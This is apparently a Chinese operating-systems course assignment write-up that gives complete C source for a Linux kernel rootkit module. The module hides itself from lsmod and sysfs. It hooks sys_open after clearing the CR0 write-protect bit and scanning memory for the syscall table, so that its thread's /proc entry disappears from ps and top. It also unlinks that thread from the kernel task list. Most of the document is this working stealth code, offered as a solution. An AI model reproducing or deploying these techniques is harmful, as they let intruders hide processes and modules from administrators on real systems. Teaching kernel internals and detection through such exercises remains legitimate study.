
## Week 8 实战

### 实战题: rootkit

- 做出能在top命令下隐藏1分，
- ps命令下隐藏1分，
- 隐藏模块（lsmod和sysfs)1分，
- 在进程队列也找不到该thread 1分

<hr>

### 思路

#### 在模块列表中隐藏(lsmod, sysfs)

从模块列表中删除。

```c
list_del_init(&__this_module.list);
kobject_del(__this_module.holders_dir->parent);
```
可用`lsmod`检验

#### 在ps, top中隐藏

修改`sys_open`，当要打开`/proc/PID`的目录的时候返回`-1`。

用`ps -ef | grep rootkit` 或 `top` 检验。

#### 从进程队列中删除
从task列表中直接删除

```c
list_del(&ptr->tasks);
```

rootkit模块输出kthread检验。

#### 附代码

```c
/*
 * rk.c -- a rootkit
 * Shuyang Shi
 * Nov, 2015
 */

#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/syscalls.h>

/* license */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("shuyang Shi");

/* Write Protect Bit (CR0:16) */
#define CR0_WP 0x00010000

/* the system call table */
static void **sys_call_table;

/* function to acquire syscall table */
static void acquire_sys_call_table(void);

/* original syscall: sys_open */
asmlinkage int (*original_sys_open)(const char *, int, int);

/* my sys_open syscall */
asmlinkage int our_sys_open(const char *, int, int);

/* task_struct for printing thread */
static struct task_struct *task;

/* printing thread */
static int rk_thread(void * args);

static char str[20];

static char *num2str(int num);

/* insert the module (dangerous) */
static int __init modinit(void)
{
	unsigned long cr0;

	pr_info("rootkit starting ...\n");

	/* delete from the module list (hide from 'lsmod', sysfs) */
	list_del_init(&__this_module.list);
	kobject_del(__this_module.holders_dir->parent);

	/* generate the printing thread */
	task = kthread_create(rk_thread, NULL, "rootkit thread");
	if (IS_ERR(task)) {
		pr_info("rootkit thread create filed.\n");
		return PTR_ERR(task);
	}
	wake_up_process(task);

	/* set pattern string of this process */
	strcpy(str, "/proc/");
	strcat(str, num2str(task->pid));
	printk("hide directory %s\n", str);

	/* acquire syscall table */
	acquire_sys_call_table();
	if (!sys_call_table) {
		pr_info("Cannot find the syscall table.\n");
		return -1;
	}

	/* hook sys_open syscall to hide from 'ps' & 'top' */
	cr0 = read_cr0();
	write_cr0(cr0 & ~CR0_WP);
	original_sys_open = sys_call_table[__NR_open];
	sys_call_table[__NR_open] = our_sys_open;
	write_cr0(cr0);

	/* delete from process queue */
	list_del(&task->tasks);

	pr_info("rootkit initialized.\n");
	return 0;
}

/* remove the module (useless) */
static void __exit modexit(void)
{
	unsigned long cr0;

	if (task) {
		kthread_stop(task);
		task = NULL;
	}

	if (sys_call_table[__NR_open] != our_sys_open)
		pr_alert("Somebody else also played with sysopen\n");

	cr0 = read_cr0();
	write_cr0(cr0 & ~CR0_WP);
	sys_call_table[__NR_open] = original_sys_open;
	write_cr0(cr0);

	pr_info("Producer exits.");
}

/* printing thread */
static int rk_thread(void *args)
{
	while (1) {
		if (kthread_should_stop())
			break;

		msleep(1000);

		for_each_process(task)
			if (task->parent->pid == 2)
				printk("#task: %s\n", task->comm);
	}
	return 0;
}

static char *num2str(int num)
{
	char *re = kmalloc(6, GFP_KERNEL), tmp;
	int i = 0, j;
	for (; num > 0; num /= 10)
		re[i++] = num % 10 + 48;
	for (j=0; j*2<i; j++) {
		tmp = re[j];
		re[j] = re[i-j-1];
		re[i-j-1] = tmp;
	}
	if (!i)
		re[0] = 48, i = 1;
	re[i] = 0;
	return re;
}

/* function to acquire syscall table */
static void acquire_sys_call_table(void)
{
	unsigned long ptr;
	unsigned long *p;

	for (ptr = (unsigned long)sys_close;
		ptr < (unsigned long)&loops_per_jiffy;
		ptr += sizeof(void *)) {

		p = (unsigned long *)ptr;

		if (p[__NR_close] == (unsigned long)sys_close) {
			pr_info("Found the sys_call_table!!!\n");
			sys_call_table = (void **)p;
			return;
		}
	}
	sys_call_table = NULL;
}

static char str_start_with(const char *str, const char *pattern) {
	char *p=str, *q=pattern;
	for (; *p && *q; p++, q++)
		if (*p != *q)
			return 0;
	return !*q ? 1 : 0;
}

/* my sys_open syscall */
asmlinkage int our_sys_open(const char *filename, int flags, int mode)
{
	int t;
	if (str_start_with(filename, str)) {
		printk("OPEN %s\n", filename);
		return -1;
	}
	t = original_sys_open(filename, flags, mode);
	return t;
}

/* register init and exit functions */
module_init(modinit);
module_exit(modexit);
```
